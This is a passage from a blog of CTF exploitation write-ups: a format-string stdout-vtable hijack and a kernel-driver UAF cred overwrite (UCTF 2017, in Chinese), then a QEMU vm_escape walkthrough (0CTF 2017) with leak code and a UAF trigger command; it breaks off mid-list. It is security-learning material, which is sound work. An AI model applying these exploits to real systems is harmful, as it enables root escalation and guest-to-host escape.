<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./NotFormat</span><br><span class="line">Have fun!</span><br><span class="line">test</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序main函数很短，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// xmm4_8@1</span></span><br><span class="line">  <span class="keyword">double</span> v9; <span class="comment">// xmm5_8@1</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+108h] [rbp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v11 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setvbuf((<span class="keyword">int</span> *)off_6CB740, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Have fun!"</span>);</span><br><span class="line">  read_line(buf);</span><br><span class="line">  <span class="built_in">printf</span>(buf, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在一个很明显的格式化字符串漏洞。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为格式化字符串使用之后立即就调用exit退出了，所以目标是直接通过一次printf劫持控制流。</p>
<h4 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h4><p>我用到的是修改FILE *stdout结构的vtable到我们构造的位置。由于没有开启PIE，所以这些内容的位置都可以确定。</p>
<h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>当控制RIP之后，程序的栈的位置与我们输入内容的位置差距很大，但是正好找到这个gadget可以迁移到我们输入的buffer。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x43f17d : ret 0x6b8</span><br></pre></td></tr></table></figure>
<p>ret之后正好会跳到0x0457fc1位置，实现栈迁移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x457fc1 : add rsp, 0x2120 ; mov eax, r12d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; re</span><br></pre></td></tr></table></figure>
<p>之后可以再次调用read，并再次迁移到一个大buffer。最后调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
<p><a href="https://gist.github.com/Eadom/9be3d15affa56ae96b72bcdbdefbce34" target="_blank" rel="noopener">uctf2017_notformat.py</a></p>
<h2 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h2><h3 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h3><p>这是一个简单的驱动题，只开启了SMEP(貌似也用不到……)。</p>
<p>提供了<code>/dev/babydriver</code>设备:</p>
<ul>
<li>read/write操作可以将buf从<code>babydev_struct.device_buf</code>读取或写入，长度限制为<code>babydev_struct.device_buf_len</code>。</li>
<li>ioctl的cmd为0x10001时可以对<code>babydev_struct.device_buf</code>重新分配。</li>
<li>close时会将<code>babydev_struct.device_buf</code>释放。</li>
</ul>
<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>一个最明显的漏洞是<code>babydev_struct</code>是一个全局变量，所有的文件描述符都共享一个<code>babydev_struct</code>，当一个文件描述符被调用close时，<code>babydev_struct.device_buf</code>会被释放。当其他未关闭的文件描述符调用时，会触发UAF，可以对一段内核空间进行读写。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当device_buf被释放掉后，这个指针成为悬空指针，扔可以进行读写，这时候希望可以有一个结构被申请然后占到原来的这个位置。最直观的想法就是如果能有cred结构直接占上来，然后就可以对cred内容修改，达到获取root权限的目的。</p>
<p>cred结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>它的大小是0xa8。于是利用的步骤如下：</p>
<ol>
<li>open两个fd，fd1及fd2。通过ioctl设置device_buf为0xa8大小。</li>
<li>close(fd1)，device_buf指针被释放。</li>
<li>现在可以通过fd2继续操作device_buf指向的内容。</li>
<li>通过fork一堆进程试图在申请cred结构的时候占到device_buf指向的位置。</li>
<li>修改占上的cred，获取root。 </li>
</ol>
<p>做的时候粗暴地试试结果发现就可以占上了……然后粗暴的把ctf用户的所有的id为0x3e8的都改成了0。</p>
<p><a href="https://gist.github.com/Eadom/c88f1eab2853281583aab150382ec710" target="_blank" rel="noopener">uctf2017_babydriver.py</a></p>
<p>P.S. 出题时希望可以把网卡驱动带进去，不然传程序进去也挺麻烦……</p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/uctf-2017-quals-pwn-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                            aria-label=": QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup"
                        >
                            QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-06-16T00:04:14+08:00">
	
		    Jun 16, 2017
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device.</p>
<p>You should read <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">VM escape - QEMU Case Study</a> before reading this writeup.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">challenge</span><br><span class="line">├── dependency</span><br><span class="line">│   ├── libnettle.so.6.2</span><br><span class="line">│   └── usr</span><br><span class="line">│       └── local</span><br><span class="line">│           └── share</span><br><span class="line">│               └── qemu</span><br><span class="line">│                   ├── bios-256k.bin</span><br><span class="line">│                   ├── efi-e1000.rom</span><br><span class="line">│                   ├── kvmvapic.bin</span><br><span class="line">│                   ├── linuxboot_dma.bin</span><br><span class="line">│                   └── vgabios-stdvga.bin</span><br><span class="line">├── launch.sh</span><br><span class="line">├── qemu-system-x86_64</span><br><span class="line">├── rootfs.cpio</span><br><span class="line">└── vmlinuz-4.8.0-52-generic</span><br></pre></td></tr></table></figure>
<p>There is a <em>qemu-system-x86_64</em> binary with a launch script, a linux kernel, a initramfs and some dependencies.</p>
<p>We can get an interactive shell by executing <code>launch.sh</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   / //_// ____/ ____/ | / /  / /   /   |  / __ )</span><br><span class="line">  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |</span><br><span class="line"> / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /</span><br><span class="line">/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/</span><br><span class="line"></span><br><span class="line">Welcome to Tencent Keenlab</span><br><span class="line">Tencent login: root</span><br><span class="line"># uname -r</span><br><span class="line">4.8.0-52-generic</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<h2 id="The-custom-vulnerable-device"><a href="#The-custom-vulnerable-device" class="headerlink" title="The custom vulnerable device"></a>The custom vulnerable device</h2><p><em>luanch.sh</em> shows there are two custom device named <em>vdd</em>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./qemu-system-x86_64 -device help 2&gt;&amp;1 | grep VDD</span><br><span class="line">name "VDD", bus PCI, desc "KeenLab virtualized Devices For Testing D"</span><br></pre></td></tr></table></figure>
<p>we can use some commands to find these devices and their io port/memroy.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:05.0 Class 00ff: 1234:2333</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"><span class="meta">#</span> cat /proc/iomem</span><br><span class="line">...</span><br><span class="line">  fe900000-fe9fffff : 0000:00:04.0</span><br><span class="line">  fea00000-feafffff : 0000:00:05.0</span><br><span class="line">...</span><br><span class="line"><span class="meta">#</span> cat /proc/ioports</span><br><span class="line">...</span><br><span class="line">  c000-c0ff : 0000:00:04.0</span><br><span class="line">  c100-c1ff : 0000:00:05.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="OOBW"><a href="#OOBW" class="headerlink" title="OOBW"></a>OOBW</h3><p>In <code>vdd_mmio_write</code>, there is a out-of-bound write vulnerability which copys QEMU heap memory to guset physical memory when we set <code>dma_len</code> larger than <code>sizeof(dam_buf)</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( addr )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32u</span>LL:</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">            opaque-&gt;dma_buf,</span><br><span class="line">            opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">            opaque-&gt;dma_len);                   <span class="comment">// OOB write</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Also in <code>vdd_mmio_write</code>, if <code>addr == 128</code> and <code>opaque-&gt;sr[129] &amp; 1 != 0</code>, we can set a timer which will execute <code>vdd_dma_timer</code> after <code>opaque-&gt;expire_time</code> ns.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( opaque-&gt;sr[<span class="number">129</span>] &amp; <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = qemu_clock_get_ns(<span class="number">0</span>);</span><br><span class="line">          timer_mod(&amp;opaque-&gt;dma_timer, v4 + opaque-&gt;expire_time);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In <code>vdd_dma_timer</code>, it invokes <code>opaque-&gt;dma_state-&gt;phys_mem_read/write</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</span><br><span class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If <code>pci_vdd_uninit</code> is invoked before <code>vdd_dma_timer</code>, the <em>dma_state</em> will be  used after free.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_vdd_uninit</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax@5</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(opaque-&gt;sr, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(opaque-&gt;dma_state, <span class="number">0</span>, <span class="number">0x330</span>uLL);</span><br><span class="line">    g_free((rcu_head *)opaque-&gt;dma_state);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;buf )</span><br><span class="line">    g_free((rcu_head *)opaque-&gt;buf);</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is divided into two steps: </p>
<ol>
<li>leak QEMU program address. </li>
<li>hijack control flow</li>
</ol>
<h3 id="Leak-QEMU-program-address"><a href="#Leak-QEMU-program-address" class="headerlink" title="Leak QEMU program address"></a>Leak QEMU program address</h3><p>First, we allocate a buffer and get it’s physical address. Then we set <code>dma_state-&gt;dst</code> to our buffer and set <code>dma_len</code> larger than <code>sizeof(dma_buf)</code>. Finally, we trigger <code>phys_mem_write</code> by <code>writel(0, piomem + 32)</code>. By searching the output, we can find libc addresses and program addresses then calculate the base address of program/libc. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phys_mem_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> dst, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_dmastate_dst(dst);</span><br><span class="line">    set_dmalen(len);</span><br><span class="line">    writel(<span class="number">0</span>, piomem + <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_leak</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pbuf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kmalloc(<span class="number">0x10000</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">memset</span>(pbuf, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    phys_mem_write(virt_to_phys(pbuf), <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// xxd(pbuf, 0x1000);</span></span><br><span class="line">    libc_base = search_libc_addr(pbuf, <span class="number">0x1000</span>);</span><br><span class="line">    printk(<span class="string">"libc base:0x%lx\n"</span>, libc_base);</span><br><span class="line">    prog_base = search_prog_addr(pbuf, <span class="number">0x1000</span>);</span><br><span class="line">    printk(<span class="string">"program base:0x%lx\n"</span>, prog_base);</span><br><span class="line">    system_addr = prog_base + SYSTEM_OFFSET;</span><br><span class="line">    printk(<span class="string">"system addr:0x%lx\n"</span>, system_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h3><p>There are three steps to exploit the use-after-free vulnerability:</p>
<ol>
<li>set a timer</li>
<li>trigger <code>pci_vdd_uninit</code></li>
<li>reallocte and rewrite <code>dma_state</code></li>
</ol>
<p>The following command can trigger <code>pci_vdd_uninit</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /sys/bus/pci/slots/4/power</span><br></pre></td></tr></table></figure>
<p>When <code>vdd_dma_timer</code> runs, we can control rip.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</span><br><span class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Becasue the QEMU is launched with <code>--nographic -append &#39;console=ttyS0&#39;</code>, so we can simply invoke <code>system(cmd)</code> to run a command in host machine and the output will show in console.</p>
<p>To invoke <code>system(cmd)</code>, We need to: </p>
<ol>
